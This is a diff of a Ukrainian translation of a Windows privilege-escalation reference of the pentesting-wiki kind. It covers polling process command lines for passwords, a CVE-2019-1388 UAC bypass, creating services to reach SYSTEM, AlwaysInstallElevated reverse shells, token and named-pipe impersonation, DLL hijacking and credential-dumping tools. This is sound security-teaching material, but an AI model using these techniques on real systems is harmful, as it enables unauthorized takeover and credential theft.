-Коли ви отримуєте shell як користувач, можуть бути заплановані завдання або інші процеси, які **передають облікові дані через командний рядок**. Скрипт нижче захоплює командні рядки процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
-```powershell
+Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**
+
+### **Моніторинг командних рядків для паролів**
+
+Коли ви отримуєте оболонку як користувач, можуть бути заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Скрипт нижче захоплює командні рядки процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
+```bash
 while($true)
 {
 $process = Get-WmiObject Win32_Process | Select-Object CommandLine
@@ -1262,9 +1266,9 @@ $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
 Compare-Object -ReferenceObject $process -DifferenceObject $process2
 }
 ```
-## Вкрадання паролів з процесів
+## Вкрадення паролів з процесів
 
-## Від низького привілейованого користувача до NT\AUTHORITY SYSTEM (CVE-2019-1388) / Обхід UAC
+## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / Обхід UAC
 
 Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, в деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM", з непривабливого користувача.
 
@@ -1314,7 +1318,7 @@ Windows 10 1709	16299	link NOT opened
 
 https://github.com/jas502n/CVE-2019-1388
 
-## Від середнього до високого рівня цілісності адміністратора / обхід UAC
+## Від середнього рівня адміністратора до високого рівня цілісності / обхід UAC
 
 Прочитайте це, щоб **дізнатися про рівні цілісності**:
 
@@ -1332,52 +1336,55 @@ integrity-levels.md
 
 ### **Новий сервіс**
 
-Якщо ви вже працюєте на процесі з високим рівнем цілісності, **перехід до SYSTEM** може бути простим, просто **створивши та виконуючи новий сервіс**:
+Якщо ви вже працюєте на процесі з високим рівнем цілісності, **шлях до SYSTEM** може бути простим, просто **створивши та виконуючи новий сервіс**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
+> [!NOTE]
+> При створенні бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл виконує необхідні дії швидко, оскільки він буде знищений через 20 секунд, якщо це не дійсна служба.
+
 ### AlwaysInstallElevated
 
-З процесу з високою цілісністю ви можете спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** зворотний шелл, використовуючи _**.msi**_ обгортку.\
-[Більше інформації про залучені ключі реєстру та як встановити _.msi_ пакет тут.](#alwaysinstallelevated)
+З процесу з високою цілісністю ви можете спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** зворотний шелл, використовуючи обгортку _**.msi**_.\
+[Більше інформації про залучені ключі реєстру та як встановити пакет _.msi_ тут.](#alwaysinstallelevated)
 
-### High + SeImpersonate privilege to System
+### High + SeImpersonate привілей до System
 
 **Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**
 
-### From SeDebug + SeImpersonate to Full Token privileges
+### Від SeDebug + SeImpersonate до повних привілей токена
 
-Якщо у вас є ці токен-привілеї (ймовірно, ви знайдете це в уже існуючому процесі з високою цілісністю), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** процесу та створити **процес з цим токеном**.\
-Використовуючи цю техніку, зазвичай **вибирається будь-який процес, що працює як SYSTEM з усіма токен-привілеями** (_так, ви можете знайти процеси SYSTEM без усіх токен-привілеїв_).\
+Якщо у вас є ці привілеї токена (ймовірно, ви знайдете це в уже існуючому процесі з високою цілісністю), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** процесу та створити **процес з цим токеном**.\
+Використовуючи цю техніку, зазвичай **вибирається будь-який процес, що працює як SYSTEM з усіма привілеями токена** (_так, ви можете знайти процеси SYSTEM без усіх привілеїв токена_).\
 **Ви можете знайти** [**приклад коду, що виконує запропоновану техніку тут**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-Цю техніку використовує meterpreter для ескалації в `getsystem`. Техніка полягає в **створенні каналу, а потім створенні/зловживанні службою для запису в цей канал**. Потім **сервер**, який створив канал, використовуючи привілей **`SeImpersonate`**, зможе **імпсонувати токен** клієнта каналу (служби), отримуючи привілеї SYSTEM.\
+Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає в **створенні каналу, а потім створенні/зловживанні службою для запису в цей канал**. Потім **сервер**, який створив канал, використовуючи привілей **`SeImpersonate`**, зможе **імпсонує токен** клієнта каналу (служби), отримуючи привілеї SYSTEM.\
 Якщо ви хочете [**дізнатися більше про іменовані канали, вам слід прочитати це**](#named-pipe-client-impersonation).\
 Якщо ви хочете прочитати приклад [**як перейти з високої цілісності до System, використовуючи іменовані канали, вам слід прочитати це**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Якщо вам вдасться **викрасти dll**, що **завантажується** процесом, що працює як **SYSTEM**, ви зможете виконувати довільний код з цими дозволами. Тому Dll Hijacking також корисний для цього виду ескалації привілеїв, і, більше того, якщо значно **легше досягти з процесу з високою цілісністю**, оскільки він матиме **права на запис** у папки, що використовуються для завантаження dll.\
+Якщо вам вдасться **викрасти dll**, що **завантажується** процесом, що працює як **SYSTEM**, ви зможете виконувати довільний код з цими дозволами. Тому Dll Hijacking також корисний для цього виду ескалації привілеїв, і, більше того, якщо набагато **легше досягти з процесу з високою цілісністю**, оскільки він матиме **права на запис** у папки, що використовуються для завантаження dll.\
 **Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**
 
-### **From Administrator or Network Service to System**
+### **Від адміністратора або мережевої служби до System**
 
-{{#ref}}
-https://github.com/sailay1996/RpcSsImpersonator
-{{#endref}}
+- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
+- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
+- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)
 
-### From LOCAL SERVICE or NETWORK SERVICE to full privs
+### Від LOCAL SERVICE або NETWORK SERVICE до повних привілей
 
 **Читати:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## More help
+## Більше допомоги
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)
 
-## Useful tools
+## Корисні інструменти
 
 **Найкращий інструмент для пошуку векторів ескалації локальних привілеїв Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
@@ -1391,14 +1398,14 @@ https://github.com/sailay1996/RpcSsImpersonator
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Диспетчера облікових даних. Виявлено.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилення зібраних паролів по домену**\
 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh є спуфером PowerShell ADIDNS/LLMNR/mDNS/NBNS та інструментом "людина посередині".**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Основна перевірка привілеїв Windows**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих вразливостей привілеїв (ДЕПРЕЦІЙНО для Watson)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права адміністратора)**
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Основна перевірка privesc Windows**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих вразливостей privesc (ДЕПРЕЦІЙНО для Watson)\
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост, шукаючи неправильні налаштування (більше інструмент для збору інформації, ніж для ескалації привілеїв) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост, шукаючи неправильні налаштування (більше інструмент збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe в github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
 [~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на неправильні налаштування (виконуваний файл попередньо скомпільований в github). Не рекомендується. Погано працює в Win10.\
@@ -1417,7 +1424,7 @@ https://github.com/sailay1996/RpcSsImpersonator
 
 _multi/recon/local_exploit_suggestor_
 
-Вам потрібно скомпілювати проект, використовуючи правильну версію .NET ([дивіться це](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете зробити:
+Вам потрібно скомпілювати проект, використовуючи правильну версію .NET ([див. це](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете зробити:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
